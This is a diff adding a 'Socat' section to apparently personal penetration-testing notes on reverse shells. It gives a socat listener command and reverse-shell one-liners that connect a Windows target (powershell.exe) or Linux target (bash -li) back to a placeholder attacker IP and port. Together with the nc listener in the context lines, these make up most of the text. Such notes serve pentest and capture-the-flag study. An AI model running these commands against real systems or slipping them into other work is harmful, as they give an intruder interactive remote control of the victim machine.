@@ -35,3 +35,33 @@ rlwrap nc -lvnp <port>
 ```
 
 ### Use the third step in technique 1 as the final step for Technique 2
+
+
+## Technique 3: Socat
+
+* This tecnique is limited to linux machines
+* You must also transfer the socat static compiled binary up to the target machine
+
+
+
+## Socat Reverse Shells
+
+**Basic Syntax: The following is equivalent to nc -nlvp <port>**
+```JavaScript
+socat TCP-L:<port> -
+```
+  
+On Windows we would use this command to connect back
+```JavaScript
+socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
+```
+
+This is the equivalent command for a Linux Target
+```JavaScript
+socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
+```
+  
+
+  
+
+
